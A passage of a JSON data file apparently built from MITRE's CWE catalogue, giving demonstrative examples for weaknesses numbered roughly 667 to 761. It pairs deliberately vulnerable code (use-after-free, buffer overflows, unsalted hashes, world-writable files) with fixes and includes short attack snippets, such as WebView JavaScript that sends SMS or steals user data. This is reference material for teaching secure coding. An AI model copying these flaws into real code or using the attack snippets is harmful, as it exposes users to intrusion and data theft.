f(pthread_mutex_t *mutex) { pthread_mutex_lock(mutex); /* access shared resource */ pthread_mutex_unlock(mutex); } However, the code does not check the value returned by pthread_mutex_lock() for errors. If pthread_mutex_lock() cannot acquire the mutex for any reason, the function may introduce a race condition into the program and result in undefined behavior. In order to avoid data races, correctly written programs must check the result of thread synchronization functions and appropriately handle all errors, either by attempting to recover from them or reporting them to higher levels. (good code) Example Language: C int f(pthread_mutex_t *mutex) { int result; result = pthread_mutex_lock(mutex); if (0 != result) return result; /* access shared resource */ return pthread_mutex_unlock(mutex); } Example 4 It may seem that the following bit of code achieves thread safety while avoiding unnecessary synchronization... (bad code) Example Language: Java if (helper == null) { synchronized (this) { if (helper == null) { helper = new Helper(); } } } return helper; The programmer wants to guarantee that only one Helper() object is ever allocated, but does not want to pay the cost of synchronization every time this code is called. Suppose that helper is not initialized. Then, thread A sees that helper==null and enters the synchronized block and begins to execute: (bad code) helper = new Helper(); If a second thread, thread B, takes over in the middle of this call and helper has not finished running the constructor, then thread B may make calls on helper while its fields hold incorrect values."
    },
    {
        "id": 668,
        "demonstrative_examples": ""
    },
    {
        "id": 669,
        "demonstrative_examples": ""
    },
    {
        "id": 670,
        "demonstrative_examples": ""
    },
    {
        "id": 671,
        "demonstrative_examples": ""
    },
    {
        "id": 672,
        "demonstrative_examples": "Example 1 The following code shows a simple example of a use after free error: (bad code) Example Language: C char* ptr = (char*)malloc (SIZE); if (err) { abrt = 1; free(ptr); } ... if (abrt) { logError(\"operation aborted before commit\", ptr); } When an error occurs, the pointer is immediately freed. However, this pointer is later incorrectly used in the logError function. Example 2 The following code shows a simple example of a double free error: (bad code) Example Language: C char* ptr = (char*)malloc (SIZE); ... if (abrt) { free(ptr); } ... free(ptr); Double free vulnerabilities have two common (and sometimes overlapping) causes: Error conditions and other exceptional circumstances Confusion over which part of the program is responsible for freeing the memory Although some double free vulnerabilities are not much more complicated than the previous example, most are spread out across hundreds of lines of code or even different files. Programmers seem particularly susceptible to freeing global variables more than once. Example 3 In the following C/C++ example the method processMessage is used to process a message received in the input array of char arrays. The input message array contains two char arrays: the first is the length of the message and the second is the body of the message. The length of the message is retrieved and used to allocate enough memory for a local char array, messageBody, to be created for the message body. The messageBody is processed in the method processMessageBody that will return an error if an error occurs while processing. If an error occurs then the return result variable is set to indicate an error and the messageBody char array memory is released using the method free and an error message is sent to the logError method. (bad code) Example Language: C #define FAIL 0 #define SUCCESS 1 #define ERROR -1 #define MAX_MESSAGE_SIZE 32 int processMessage(char **message) { int result = SUCCESS; int length = getMessageLength(message[0]); char *messageBody; if ((length > 0) && (length < MAX_MESSAGE_SIZE)) { messageBody = (char*)malloc(length*sizeof(char)); messageBody = &message[1][0]; int success = processMessageBody(messageBody); if (success == ERROR) { result = ERROR; free(messageBody); } } else { printf(\"Unable to process message; invalid message length\"); result = FAIL; } if (result == ERROR) { logError(\"Error processing message\", messageBody); } return result; } However, the call to the method logError includes the messageBody after the memory for messageBody has been released using the free method. This can cause unexpected results and may lead to system crashes. A variable should never be used after its memory resources have been released. (good code) Example Language: C ... messageBody = (char*)malloc(length*sizeof(char)); messageBody = &message[1][0]; int success = processMessageBody(messageBody); if (success == ERROR) { result = ERROR; logError(\"Error processing message\", messageBody); free(messageBody); } ..."
    },
    {
        "id": 673,
        "demonstrative_examples": "Example 1 Consider a blog publishing tool, which might have three explicit control spheres: the creation of articles, only accessible to a \"publisher;\" commenting on articles, only accessible to a \"commenter\" who is a registered user; and reading articles, only accessible to an anonymous reader. Suppose that the application is deployed on a web server that is shared with untrusted parties. If a local user can modify the data files that define who a publisher is, then this user has modified the control sphere. In this case, the issue would be resultant from another weakness such as insufficient permissions. Example 2 In Untrusted Search Path ( CWE-426 ), a user might be able to define the PATH environment variable to cause the product to search in the wrong directory for a library to load. The product\\'s intended sphere of control would include \"resources that are only modifiable by the person who installed the product.\" The PATH effectively changes the definition of this sphere so that it overlaps the attacker\\'s sphere of control."
    },
    {
        "id": 674,
        "demonstrative_examples": "Example 1 In this example a mistake exists in the code where the exit condition contained in flg is never called. This results in the function calling itself over and over again until the stack is exhausted. (bad code) Example Language: C void do_something_recursive (int flg) { ... // Do some real work here, but the value of flg is unmodified if (flg) { do_something_recursive (flg); }    // flg is never modified so it is always TRUE - this call will continue until the stack explodes } int flag = 1; // Set to TRUE do_something_recursive (flag); Note that the only difference between the Good and Bad examples is that the recursion flag will change value and cause the recursive to return. (good code) Example Language: C void do_something_recursive (int flg) { ... // Do some real work here // Modify value of flg on done condition if (flg) { do_something_recursive (flg); }    // returns when flg changes to 0 } int flag = 1; // Set to TRUE do_something_recursive (flag);"
    },
    {
        "id": 675,
        "demonstrative_examples": ""
    },
    {
        "id": 676,
        "demonstrative_examples": "Example 1 The following code attempts to create a local copy of a buffer to perform some manipulations to the data. (bad code) Example Language: C void manipulate_string(char * string){ char buf[24]; strcpy(buf, string); ... } However, the programmer does not ensure that the size of the data pointed to by string will fit in the local buffer and copies the data with the potentially dangerous strcpy() function. This may result in a buffer overflow condition if an attacker can influence the contents of the string parameter."
    },
    {
        "id": 680,
        "demonstrative_examples": ""
    },
    {
        "id": 681,
        "demonstrative_examples": "Example 1 In the following Java example, a float literal is cast to an integer, thus causing a loss of precision. (bad code) Example Language: Java int i = (int) 33457.8f; Example 2 This code adds a float and an integer together, casting the result to an integer. (bad code) Example Language: PHP $floatVal = 1.8345; $intVal = 3; $result = (int)$floatVal + $intVal; Normally, PHP will preserve the precision of this operation, making $result = 4.8345. After the cast to int, it is reasonable to expect PHP to follow rounding convention and set $result = 5. However, the explicit cast to int always rounds DOWN, so the final value of $result is 4. This behavior may have unintended consequences. Example 3 In this example the variable amount can hold a negative value when it is returned. Because the function is declared to return an unsigned int, amount will be implicitly converted to unsigned. (bad code) Example Language: C unsigned int readdata () { int amount = 0; ... if (result == ERROR) amount = -1; ... return amount; } If the error condition in the code above is met, then the return value of readdata() will be 4,294,967,295 on a system that uses 32-bit integers. Example 4 In this example, depending on the return value of accecssmainframe(), the variable amount can hold a negative value when it is returned. Because the function is declared to return an unsigned value, amount will be implicitly cast to an unsigned number. (bad code) Example Language: C unsigned int readdata () { int amount = 0; ... amount = accessmainframe(); ... return amount; } If the return value of accessmainframe() is -1, then the return value of readdata() will be 4,294,967,295 on a system that uses 32-bit integers."
    },
    {
        "id": 682,
        "demonstrative_examples": "Example 1 The following image processing code allocates a table for images. (bad code) Example Language: C img_t table_ptr; /*struct containing img data, 10kB each*/ int num_imgs; ... num_imgs = get_num_imgs(); table_ptr = (img_t*)malloc(sizeof(img_t)*num_imgs); ... This code intends to allocate a table of size num_imgs, however as num_imgs grows large, the calculation determining the size of the list will eventually overflow ( CWE-190 ). This will result in a very small list to be allocated instead. If the subsequent code operates on the list as if it were num_imgs long, it may result in many types of out-of-bounds problems ( CWE-119 ). Example 2 \"This code attempts to calculate a football team's average number of yards gained per touchdown.\" (bad code) Example Language: Java ... int touchdowns = team.getTouchdowns(); int yardsGained = team.getTotalYardage(); System.out.println(team.getName() + \" averages \" + yardsGained / touchdowns + \"yards gained for every touchdown scored\"); ... The code does not consider the event that the team they are querying has not scored a touchdown, but has gained yardage. In that case, we should expect an ArithmeticException to be thrown by the JVM. This could lead to a loss of availability if our error handling code is not set up correctly. Example 3 This example attempts to calculate the position of the second byte of a pointer. (bad code) Example Language: C int *p = x; char * second_char = (char *)(p + 1); In this example, second_char is intended to point to the second byte of p. But, adding 1 to p actually adds sizeof(int) to p, giving a result that is incorrect (3 bytes off on 32-bit platforms). If the resulting memory address is read, this could potentially be an information leak. If it is a write, it could be a security-critical write to unauthorized memory-- whether or not it is a buffer overflow. Note that the above code may also be wrong in other ways, particularly in a little endian environment."
    },
    {
        "id": 683,
        "demonstrative_examples": "Example 1 The following PHP method authenticates a user given a username/password combination but is called with the parameters in reverse order. (bad code) Example Language: PHP function authenticate($username, $password) { // authenticate user ... } \"authenticate($_POST['password'], $_POST['username']);\""
    },
    {
        "id": 684,
        "demonstrative_examples": ""
    },
    {
        "id": 685,
        "demonstrative_examples": ""
    },
    {
        "id": 686,
        "demonstrative_examples": ""
    },
    {
        "id": 687,
        "demonstrative_examples": "Example 1 This Perl code intends to record whether a user authenticated successfully or not, and to exit if the user fails to authenticate. However, when it calls ReportAuth(), the third argument is specified as 0 instead of 1, so it does not exit. (bad code) Example Language: Perl sub ReportAuth { my ($username, $result, $fatal) = @_; PrintLog(\"auth: username=%s, result=%d\", $username, $result); if (($result ne \"success\") && $fatal) { die \"Failed!\\\\n\"; } } sub PrivilegedFunc { my $result = CheckAuth($username); ReportAuth($username, $result, 0); DoReallyImportantStuff(); }"
    },
    {
        "id": 688,
        "demonstrative_examples": "Example 1 In the following Java snippet, the accessGranted() method is accidentally called with the static ADMIN_ROLES array rather than the user roles. (bad code) Example Language: Java private static final String[] ADMIN_ROLES = ...; public boolean void accessGranted(String resource, String user) { String[] userRoles = getUserRoles(user); return accessGranted(resource, ADMIN_ROLES); } private boolean void accessGranted(String resource, String[] userRoles) { // grant or deny access based on user roles ... }"
    },
    {
        "id": 690,
        "demonstrative_examples": "Example 1 \"The code below makes a call to the getUserName() function but doesn't check the return value before dereferencing (which may cause a NullPointerException).\" (bad code) Example Language: Java String username = getUserName(); if (username.equals(ADMIN_USER)) { ... } Example 2 This example takes an IP address from a user, verifies that it is well formed and then looks up the hostname and copies it into a buffer. (bad code) Example Language: C void host_lookup(char *user_supplied_addr){ struct hostent *hp; in_addr_t *addr; char hostname[64]; in_addr_t inet_addr(const char *cp); /*routine that ensures user_supplied_addr is in the right format for conversion */ validate_addr_form(user_supplied_addr); addr = inet_addr(user_supplied_addr); hp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET); strcpy(hostname, hp->h_name); } If an attacker provides an address that appears to be well-formed, but the address does not resolve to a hostname, then the call to gethostbyaddr() will return NULL. Since the code does not check the return value from gethostbyaddr ( CWE-252 ), a NULL pointer dereference ( CWE-476 ) would then occur in the call to strcpy(). Note that this code is also vulnerable to a buffer overflow ( CWE-119 )."
    },
    {
        "id": 691,
        "demonstrative_examples": ""
    },
    {
        "id": 692,
        "demonstrative_examples": ""
    },
    {
        "id": 693,
        "demonstrative_examples": ""
    },
    {
        "id": 694,
        "demonstrative_examples": ""
    },
    {
        "id": 695,
        "demonstrative_examples": ""
    },
    {
        "id": 696,
        "demonstrative_examples": ""
    },
    {
        "id": 697,
        "demonstrative_examples": "Example 1 Consider an application in which Truck objects are defined to be the same if they have the same make, the same model, and were manufactured in the same year. (bad code) Example Language: Java public class Truck { private String make; private String model; private int year; public boolean equals(Object o) { if (o == null) return false; if (o == this) return true; if (!(o instanceof Truck)) return false; Truck t = (Truck) o; return (this.make.equals(t.getMake()) && this.model.equals(t.getModel())); } } Here, the equals() method only checks the make and model of the Truck objects, but the year of manufacture is not included. Example 2 This example defines a fixed username and password. The AuthenticateUser() function is intended to accept a username and a password from an untrusted user, and check to ensure that it matches the username and password. If the username and password match, AuthenticateUser() is intended to indicate that authentication succeeded. (bad code) Example Language: C /* Ignore CWE-259 (hard-coded password) and CWE-309 (use of password system for authentication) for this example. */ char *username = \"admin\"; char *pass = \"password\"; int AuthenticateUser(char *inUser, char *inPass) { if (strncmp(username, inUser, strlen(inUser))) { logEvent(\"Auth failure of username using strlen of inUser\"); return(AUTH_FAIL); } if (! strncmp(pass, inPass, strlen(inPass))) { logEvent(\"Auth success of password using strlen of inUser\"); return(AUTH_SUCCESS); } else { logEvent(\"Auth fail of password using sizeof\"); return(AUTH_FAIL); } } int main (int argc, char **argv) { int authResult; if (argc < 3) { ExitError(\"Usage: Provide a username and password\"); } authResult = AuthenticateUser(argv[1], argv[2]); if (authResult == AUTH_SUCCESS) { DoAuthenticatedTask(argv[1]); } else { ExitError(\"Authentication failed\"); } } \"In AuthenticateUser(), the strncmp() call uses the string length of an attacker-provided inPass parameter in order to determine how many characters to check in the password. So, if the attacker only provides a password of length 1, the check will only examine the first byte of the application's password before determining success.\" As a result, this partial comparison leads to improper authentication ( CWE-287 ). Any of these passwords would still cause authentication to succeed for the \"admin\" user: (attack code) p pa pas pass This significantly reduces the search space for an attacker, making brute force attacks more feasible. The same problem also applies to the username, so values such as \"a\" and \"adm\" will succeed for the username. While this demonstrative example may not seem realistic, see the Observed Examples for CVE entries that effectively reflect this same weakness."
    },
    {
        "id": 698,
        "demonstrative_examples": "Example 1 This code queries a server and displays its status when a request comes from an authorized IP address. (bad code) Example Language: PHP \"$requestingIP = $_SERVER['REMOTE_ADDR'];\" if(!in_array($requestingIP,$ipAllowList)){ echo \"You are not authorized to view this page\"; http_redirect($errorPageURL); } $status = getServerStatus(); echo $status; ... This code redirects unauthorized users, but continues to execute code after calling http_redirect(). This means even unauthorized users may be able to access the contents of the page or perform a DoS attack on the server being queried. Also, note that this code is vulnerable to an IP address spoofing attack ( CWE-212 )."
    },
    {
        "id": 703,
        "demonstrative_examples": ""
    },
    {
        "id": 704,
        "demonstrative_examples": ""
    },
    {
        "id": 705,
        "demonstrative_examples": ""
    },
    {
        "id": 706,
        "demonstrative_examples": ""
    },
    {
        "id": 707,
        "demonstrative_examples": ""
    },
    {
        "id": 708,
        "demonstrative_examples": ""
    },
    {
        "id": 710,
        "demonstrative_examples": ""
    },
    {
        "id": 732,
        "demonstrative_examples": "Example 1 The following code sets the umask of the process to 0 before creating a file and writing \"Hello world\" into the file. (bad code) Example Language: C #define OUTFILE \"hello.out\" umask(0); FILE *out; /* Ignore CWE-59 (link following) for brevity */ out = fopen(OUTFILE, \"w\"); if (out) { fprintf(out, \"hello world!\\\\n\"); fclose(out); } After running this program on a UNIX system, running the \"ls -l\" command might return the following output: (result) -rw-rw-rw- 1 username 13 Nov 24 17:58 hello.out The \"rw-rw-rw-\" string indicates that the owner, group, and world (all users) can read the file and write to it. Example 2 This code creates a home directory for a new user, and makes that user the owner of the directory. If the new directory cannot be owned by the user, the directory is deleted. (bad code) Example Language: PHP function createUserDir($username){ \"$path = '/home/'.$username;\" if(!mkdir($path)){ return false; } if(!chown($path,$username)){ rmdir($path); return false; } return true; } Because the optional \"mode\" argument is omitted from the call to mkdir(), the directory is created with the default permissions 0777. Simply setting the new user as the owner of the directory does not explicitly change the permissions of the directory, leaving it with the default. This default allows any user to read and write to the directory, allowing an attack on the user\\'s files. The code also fails to change the owner group of the directory, which may result in access by unexpected groups. This code may also be vulnerable to Path Traversal ( CWE-22 ) attacks if an attacker supplies a non alphanumeric username. Example 3 The following code snippet might be used as a monitor to periodically record whether a web site is alive. To ensure that the file can always be modified, the code uses chmod() to make the file world-writable. (bad code) Example Language: Perl $fileName = \"secretFile.out\"; if (-e $fileName) { chmod 0777, $fileName; } my $outFH; if (! open($outFH, \">>$fileName\")) { ExitError(\"Couldn\\'t append to $fileName: $!\"); } my $dateString = FormatCurrentTime(); my $status = IsHostAlive(\"cwe.mitre.org\"); print $outFH \"$dateString cwe status: $status!\\\\n\"; close($outFH); The first time the program runs, it might create a new file that inherits the permissions from its environment. A file listing might look like: (result) -rw-r--r-- 1 username 13 Nov 24 17:58 secretFile.out This listing might occur when the user has a default umask of 022, which is a common setting. Depending on the nature of the file, the user might not have intended to make it readable by everyone on the system. \"The next time the program runs, however - and all subsequent executions - the chmod will set the file's permissions so that the owner, group, and world (all users) can read the file and write to it:\" (result) -rw-rw-rw- 1 username 13 Nov 24 17:58 secretFile.out Perhaps the programmer tried to do this because a different process uses different permissions that might prevent the file from being updated. Example 4 The following command recursively sets world-readable permissions for a directory and all of its children: (bad code) Example Language: Shell chmod -R ugo+r DIRNAME If this command is run from a program, the person calling the program might not expect that all the files under the directory will be world-readable. If the directory is expected to contain private data, this could become a security problem."
    },
    {
        "id": 733,
        "demonstrative_examples": ""
    },
    {
        "id": 749,
        "demonstrative_examples": "Example 1 In the following Java example the method removeDatabase will delete the database with the name specified in the input parameter. (bad code) Example Language: Java public void removeDatabase(String databaseName) { try { Statement stmt = conn.createStatement(); stmt.execute(\"DROP DATABASE \" + databaseName); } catch (SQLException ex) {...} } The method in this example is declared public and therefore is exposed to any class in the application. Deleting a database should be considered a critical operation within an application and access to this potentially dangerous method should be restricted. Within Java this can be accomplished simply by declaring the method private thereby exposing it only to the enclosing class as in the following example. (good code) Example Language: Java private void removeDatabase(String databaseName) { try { Statement stmt = conn.createStatement(); stmt.execute(\"DROP DATABASE \" + databaseName); } catch (SQLException ex) {...} } Example 2 These Android and iOS applications intercept URL loading within a WebView and perform special actions if a particular URL scheme is used, thus allowing the Javascript within the WebView to communicate with the application: (bad code) Example Language: Java // Android @Override public boolean shouldOverrideUrlLoading(WebView view, String url){ if (url.substring(0,14).equalsIgnoreCase(\"examplescheme:\")){ if(url.substring(14,25).equalsIgnoreCase(\"getUserInfo\")){ writeDataToView(view, UserData); return false; } else{ return true; } } } (bad code) Example Language: Objective-C // iOS -(BOOL) webView:(UIWebView *)exWebView shouldStartLoadWithRequest:(NSURLRequest *)exRequest navigationType:(UIWebViewNavigationType)exNavigationType { NSURL *URL = [exRequest URL]; if ([[URL scheme] isEqualToString:@\"exampleScheme\"]) { NSString *functionString = [URL resourceSpecifier]; if ([functionString hasPrefix:@\"specialFunction\"]) { // Make data available back in webview. UIWebView *webView = [self writeDataToView:[URL query]]; } return NO; } return YES; } A call into native code can then be initiated by passing parameters within the URL: (attack code) Example Language: JavaScript window.location = examplescheme://method?parameter=value Because the application does not check the source, a malicious website loaded within this WebView has the same access to the API as a trusted site. Example 3 This application uses a WebView to display websites, and creates a Javascript interface to a Java object to allow enhanced functionality on a trusted website: (bad code) Example Language: Java public class WebViewGUI extends Activity { WebView mainWebView; public void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); mainWebView = new WebView(this); mainWebView.getSettings().setJavaScriptEnabled(true); mainWebView.addJavascriptInterface(new JavaScriptInterface(), \"userInfoObject\"); mainWebView.loadUrl(\"file:///android_asset/www/index.html\"); setContentView(mainWebView); } final class JavaScriptInterface { JavaScriptInterface () {} public String getUserInfo() { return currentUser.Info(); } } } Before Android 4.2 all methods, including inherited ones, are exposed to Javascript when using addJavascriptInterface(). This means that a malicious website loaded within this WebView can use reflection to acquire a reference to arbitrary Java objects. This will allow the website code to perform any action the parent application is authorized to. For example, if the application has permission to send text messages: (attack code) Example Language: JavaScript <script> \"userInfoObject.getClass().forName('android.telephony.SmsManager').getMethod('getDefault',null).sendTextMessage(attackNumber, null, attackMessage, null, null);\" </script> This malicious script can use the userInfoObject object to load the SmsManager object and send arbitrary text messages to any recipient. Example 4 After Android 4.2, only methods annotated with @JavascriptInterface are available in JavaScript, protecting usage of getClass() by default, as in this example: (bad code) Example Language: Java final class JavaScriptInterface { JavaScriptInterface () { } @JavascriptInterface public String getUserInfo() { return currentUser.Info(); } } This code is not vulnerable to the above attack, but still may expose user info to malicious pages loaded in the WebView. Even malicious iframes loaded within a trusted page may access the exposed interface: (attack code) Example Language: JavaScript <script> var info = window.userInfoObject.getUserInfo(); sendUserInfo(info); </script> \"This malicious code within an iframe is able to access the interface object and steal the user's data.\""
    },
    {
        "id": 754,
        "demonstrative_examples": "Example 1 Consider the following code segment: (bad code) Example Language: C char buf[10], cp_buf[10]; fgets(buf, 10, stdin); strcpy(cp_buf, buf); The programmer expects that when fgets() returns, buf will contain a null-terminated string of length 9 or less. But if an I/O error occurs, fgets() will not null-terminate buf. Furthermore, if the end of the file is reached before any characters are read, fgets() returns without writing anything to buf. In both of these situations, fgets() signals that something unusual has happened by returning NULL, but in this code, the warning will not be noticed. The lack of a null terminator in buf can result in a buffer overflow in the subsequent call to strcpy(). Example 2 The following code does not check to see if memory allocation succeeded before attempting to use the pointer returned by malloc(). (bad code) Example Language: C buf = (char*) malloc(req_size); strncpy(buf, xfer, req_size); The traditional defense of this coding error is: \"If my program runs out of memory, it will fail. It doesn\\'t matter whether I handle the error or simply allow the program to die with a segmentation fault when it tries to dereference the null pointer.\" This argument ignores three important considerations: Depending upon the type and size of the application, it may be possible to free memory that is being used elsewhere so that execution can continue. It is impossible for the program to perform a graceful exit if required. If the program is performing an atomic operation, it can leave the system in an inconsistent state. The programmer has lost the opportunity to record diagnostic information. Did the call to malloc() fail because req_size was too large or because there were too many requests being handled at the same time? Or was it caused by a memory leak that has built up over time? Without handling the error, there is no way to know. Example 3 The following examples read a file into a byte array. (bad code) Example Language: C# char[] byteArray = new char[1024]; for (IEnumerator i=users.GetEnumerator(); i.MoveNext() ;i.Current()) { String userName = (String) i.Current(); String pFileName = PFILE_ROOT + \"/\" + userName; StreamReader sr = new StreamReader(pFileName); sr.Read(byteArray,0,1024);//the file is always 1k bytes sr.Close(); processPFile(userName, byteArray); } (bad code) Example Language: Java FileInputStream fis; byte[] byteArray = new byte[1024]; for (Iterator i=users.iterator(); i.hasNext();) { String userName = (String) i.next(); String pFileName = PFILE_ROOT + \"/\" + userName; FileInputStream fis = new FileInputStream(pFileName); fis.read(byteArray); // the file is always 1k bytes fis.close(); processPFile(userName, byteArray); The code loops through a set of users, reading a private data file for each user. The programmer assumes that the files are always 1 kilobyte in size and therefore ignores the return value from Read(). If an attacker can create a smaller file, the program will recycle the remainder of the data from the previous user and treat it as though it belongs to the attacker. Example 4 The following code does not check to see if the string returned by getParameter() is null before calling the member function compareTo(), potentially causing a NULL dereference. (bad code) Example Language: Java String itemName = request.getParameter(ITEM_NAME); if (itemName.compareTo(IMPORTANT_ITEM) == 0) { ... } ... The following code does not check to see if the string returned by the Item property is null before calling the member function Equals(), potentially causing a NULL dereference. (bad code) Example Language: Java String itemName = request.Item(ITEM_NAME); if (itemName.Equals(IMPORTANT_ITEM)) { ... } ... The traditional defense of this coding error is: \"I know the requested value will always exist because.... If it does not exist, the program cannot perform the desired behavior so it doesn\\'t matter whether I handle the error or simply allow the program to die dereferencing a null value.\" But attackers are skilled at finding unexpected paths through programs, particularly when exceptions are involved. Example 5 The following code shows a system property that is set to null and later dereferenced by a programmer who mistakenly assumes it will always be defined. (bad code) Example Language: Java System.clearProperty(\"os.name\"); ... String os = System.getProperty(\"os.name\"); if (os.equalsIgnoreCase(\"Windows 95\")) System.out.println(\"Not supported\"); The traditional defense of this coding error is: \"I know the requested value will always exist because.... If it does not exist, the program cannot perform the desired behavior so it doesn\\'t matter whether I handle the error or simply allow the program to die dereferencing a null value.\" But attackers are skilled at finding unexpected paths through programs, particularly when exceptions are involved. Example 6 The following VB.NET code does not check to make sure that it has read 50 bytes from myfile.txt. This can cause DoDangerousOperation() to operate on an unexpected value. (bad code) Example Language: C# Dim MyFile As New FileStream(\"myfile.txt\", FileMode.Open, FileAccess.Read, FileShare.Read) Dim MyArray(50) As Byte MyFile.Read(MyArray, 0, 50) DoDangerousOperation(MyArray(20)) In .NET, it is not uncommon for programmers to misunderstand Read() and related methods that are part of many System.IO classes. The stream and reader classes do not consider it to be unusual or exceptional if only a small amount of data becomes available. These classes simply add the small amount of data to the return buffer, and set the return value to the number of bytes or characters read. There is no guarantee that the amount of data returned is equal to the amount of data requested. Example 7 This example takes an IP address from a user, verifies that it is well formed and then looks up the hostname and copies it into a buffer. (bad code) Example Language: C void host_lookup(char *user_supplied_addr){ struct hostent *hp; in_addr_t *addr; char hostname[64]; in_addr_t inet_addr(const char *cp); /*routine that ensures user_supplied_addr is in the right format for conversion */ validate_addr_form(user_supplied_addr); addr = inet_addr(user_supplied_addr); hp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET); strcpy(hostname, hp->h_name); } If an attacker provides an address that appears to be well-formed, but the address does not resolve to a hostname, then the call to gethostbyaddr() will return NULL. Since the code does not check the return value from gethostbyaddr ( CWE-252 ), a NULL pointer dereference ( CWE-476 ) would then occur in the call to strcpy(). Note that this code is also vulnerable to a buffer overflow ( CWE-119 ). Example 8 In the following C/C++ example the method outputStringToFile opens a file in the local filesystem and outputs a string to the file. The input parameters output and filename contain the string to output to the file and the name of the file respectively. (bad code) Example Language: C++ int outputStringToFile(char *output, char *filename) { openFileToWrite(filename); writeToFile(output); closeFile(filename); } However, this code does not check the return values of the methods openFileToWrite, writeToFile, closeFile to verify that the file was properly opened and closed and that the string was successfully written to the file. The return values for these methods should be checked to determine if the method was successful and allow for detection of errors or unexpected conditions as in the following example. (good code) Example Language: C++ int outputStringToFile(char *output, char *filename) { int isOutput = SUCCESS; int isOpen = openFileToWrite(filename); if (isOpen == FAIL) { printf(\"Unable to open file %s\", filename); isOutput = FAIL; } else { int isWrite = writeToFile(output); if (isWrite == FAIL) { printf(\"Unable to write to file %s\", filename); isOutput = FAIL; } int isClose = closeFile(filename); if (isClose == FAIL) isOutput = FAIL; } return isOutput; } Example 9 In the following Java example the method readFromFile uses a FileReader object to read the contents of a file. The FileReader object is created using the File object readFile, the readFile object is initialized using the setInputFile method. The setInputFile method should be called before calling the readFromFile method. (bad code) Example Language: Java private File readFile = null; public void setInputFile(String inputFile) { // create readFile File object from string containing name of file } public void readFromFile() { try { reader = new FileReader(readFile); // read input file } catch (FileNotFoundException ex) {...} } However, the readFromFile method does not check to see if the readFile object is null, i.e. has not been initialized, before creating the FileReader object and reading from the input file. The readFromFile method should verify whether the readFile object is null and output an error message and raise an exception if the readFile object is null, as in the following code. (good code) Example Language: Java private File readFile = null; public void setInputFile(String inputFile) { // create readFile File object from string containing name of file } public void readFromFile() { try { if (readFile == null) { System.err.println(\"Input file has not been set, call setInputFile method before calling openInputFile\"); throw NullPointerException; } reader = new FileReader(readFile); // read input file } catch (FileNotFoundException ex) {...} catch (NullPointerException ex) {...} }"
    },
    {
        "id": 755,
        "demonstrative_examples": ""
    },
    {
        "id": 756,
        "demonstrative_examples": "Example 1 In the snippet below, an unchecked runtime exception thrown from within the try block may cause the container to display its default error page (which may contain a full stack trace, among other things). (bad code) Example Language: Java Public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { try { ... } catch (ApplicationSpecificException ase) { logger.error(\"Caught: \" + ase.toString()); } } Example 2 The mode attribute of the <customErrors> tag in the Web.config file defines whether custom or default error pages are used. In the following insecure ASP.NET application setting, custom error message mode is turned off. An ASP.NET error message with detailed stack trace and platform versions will be returned. (bad code) Example Language: ASP.NET <customErrors mode=\"Off\" /> A more secure setting is to set the custom error message mode for remote users only. No defaultRedirect error page is specified. The local user on the web server will see a detailed stack trace. For remote users, an ASP.NET error message with the server customError configuration setting and the platform version will be returned. (good code) Example Language: ASP.NET <customErrors mode=\"RemoteOnly\" /> Another secure option is to set the mode attribute of the <customErrors> tag to use a custom page as follows: (good code) Example Language: ASP.NET <customErrors mode=\"On\" defaultRedirect=\"YourErrorPage.htm\" />"
    },
    {
        "id": 757,
        "demonstrative_examples": ""
    },
    {
        "id": 758,
        "demonstrative_examples": ""
    },
    {
        "id": 759,
        "demonstrative_examples": "Example 1 In both of these examples, a user is logged in if their given password matches a stored password: (bad code) Example Language: C unsigned char *check_passwd(char *plaintext) { ctext = simple_digest(\"sha1\",plaintext,strlen(plaintext), ... ); //Login if hash matches stored hash if (equal(ctext, secret_password())) { login_user(); } } (bad code) Example Language: Java String plainText = new String(plainTextIn); MessageDigest encer = MessageDigest.getInstance(\"SHA\"); encer.update(plainTextIn); byte[] digest = password.digest(); //Login if hash matches stored hash if (equal(digest,secret_password())) { login_user(); } This code relies exclusively on a password mechanism ( CWE-309 ) using only one factor of authentication ( CWE-308 \"). If an attacker can steal or guess a user's password, they are given full access to their account. Note this code also uses SHA-1, which is a weak hash (\" CWE-328 ). It also does not use a salt ( CWE-759 ). Example 2 \"In this example, a new user provides a new username and password to create an account. The program hashes the new user's password then stores it in a database.\" (bad code) Example Language: Python def storePassword(userName,Password): \"hasher = hashlib.new('md5')\" hasher.update(Password) hashedPassword = hasher.digest() # UpdateUserLogin returns True on success, False otherwise return updateUserLogin(userName,hashedPassword) While it is good to avoid storing a cleartext password, the program does not provide a salt to the hashing function, thus increasing the chances of an attacker being able to reverse the hash and discover the original password if the database is compromised. Fixing this is as simple as providing a salt to the hashing function on initialization: (good code) Example Language: Python def storePassword(userName,Password): \"hasher = hashlib.new('md5',b'SaltGoesHere')\" hasher.update(Password) hashedPassword = hasher.digest() # UpdateUserLogin returns True on success, False otherwise return updateUserLogin(userName,hashedPassword) Note that regardless of the usage of a salt, the md5 hash is no longer considered secure, so this example still exhibits CWE-327 ."
    },
    {
        "id": 760,
        "demonstrative_examples": ""
    },
    {
        "id": 761,
        "demonstrative_examples": "Example 1 In this example, the programmer dynamically allocates a buffer to hold a string and then searches for a specific character. After completing the search, the programmer attempts to release the allocated memory and return SUCCESS or FAILURE to the caller. Note: for simplification, this example uses a hard-coded \"Search Me!\" string and a constant string length of 20. (bad code) Example Language: C #define SUCCESS (1) #define FAILURE (0) int contains_char(char c){ char *str; str = (char*)malloc(20*sizeof(char)); strcpy(str, \"Search Me!\"); while( *str != NULL){ if( *str == c ){ /* matched char, free string and return success */ free(str); return SUCCESS; } \"/* didn't match yet, increment pointer and try next char */\" str = str + 1; } /* we did not match the char in the string, free mem and return failure */ free(str); return FAILURE; } However, if the character is not at the beginning of the string, or if it is not in the string at all, then the pointer will not be at the start of the buffer when the programmer frees it. Instead of freeing the pointer in the middle of the buffer, the programmer can use an indexing pointer to step through the memory or abstract the memory calculations by using array indexing. (good code) Example Language: C #define SUCCESS (1) #define FAILURE (0) int cointains_char(char c){ char *str; int i = 0; str = (char*)malloc(20*sizeof(char)); strcpy(str, \"Search Me!\"); while( i < strlen(str) ){ if( str[i] == c ){ /* matched char, free string and return success */ free(str); return SUCCESS; } \"/* didn't match yet, increment pointer and try next char */\" i = i + 1; } /* we did not match the char in the string, free mem and return failure */ free(str); return FAILURE; } Example 2 This code attempts to tokenize a string and place it into an array using the strsep function, which inserts a \\\\0 byte in place of whitespace or a tab character. After finishing the loop, each string in the AP array points to a location within the input 